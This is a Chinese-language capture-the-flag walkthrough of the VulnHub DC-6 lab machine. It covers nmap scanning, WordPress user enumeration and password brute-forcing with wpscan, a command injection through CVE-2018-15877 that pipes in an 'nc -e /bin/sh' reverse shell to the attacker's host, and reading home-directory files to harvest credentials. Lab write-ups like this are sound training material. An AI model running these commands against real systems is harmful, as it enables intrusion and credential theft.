# DC 6

## 环境准备

- 镜像地址：https://www.vulnhub.com/entry/dc-6,315/

## 知识点

## 信息收集

```bash
ifconfig eth0 # 这里是因为本地局域网
nmap -sP 10.30.0.0/24 # IP探测 扫描本地C段的网络端口信息
nmap -A -p- -T4 10.30.0.156

echo "10.30.0.156 wordy" >> /etc/hosts ## 参考DC-2
```

![image](./img/vulnhub-dc6-1.png)


## 漏洞利用

按照DC-2的经验进行测试一波
```
wpscan --url http://wordy --enumerate u
```

![image](./img/vulnhub-dc6-2.png)

得到的用户列表

```
admin
mark
graham
sarah
jens
```

根据作者提示

![image](./img/vulnhub-dc6-3.png)

```bash
cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
wpscan --url http://wordy --passwords passwords.txt
```

![image](./img/vulnhub-dc6-4.png)

扫描出一个用户的账号密码：mark / helpdesk01

登录后发现Activity monitor插件，首页也提示存在插件漏洞

```
http://wordy/wp-admin/admin.php?page=plainview_activity_monitor
```

百度搜索到:CVE-2018-15877
- https://www.cnblogs.com/SeanGyy/p/15576711.html1

```bash
nc -lvnp 4444 #kali
127.0.0.1| nc -e /bin/sh 10.30.0.81 4444
```

![image](./img/vulnhub-dc6-5.png)
![image](./img/vulnhub-dc6-6.png)

接下来就是提权操作

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
cd /home
ls -alR # 发现敏感信息
```

![image](./img/vulnhub-dc6-7.png)

```
cat ./mark/stuff/things-to-do.txt
```

![image](./img/vulnhub-dc6-8.png)

得到新的用户账号密码
```
graham   GSo7isUM1D4
```

```bash
ssh graham@10.30.0.156
sudo -l
```

![image](./img/vulnhub-dc6-9.png)


## 参考链接
- https://github.com/ffffffff0x/1earn/blob/004fbc731d7ce8004b9c2a38613d39f71cd8cb6e/1earn/Security/%E5%AE%89%E5%85%A8%E8%B5%84%E6%BA%90/%E9%9D%B6%E6%9C%BA/VulnHub/DC/DC6-WalkThrough.md
- http://www.kxsy.work/2021/07/30/shen-tou-dc-6/
- https://peiqiwiki.yuque.com/staff-ws572w/ku05f9/ywkpnt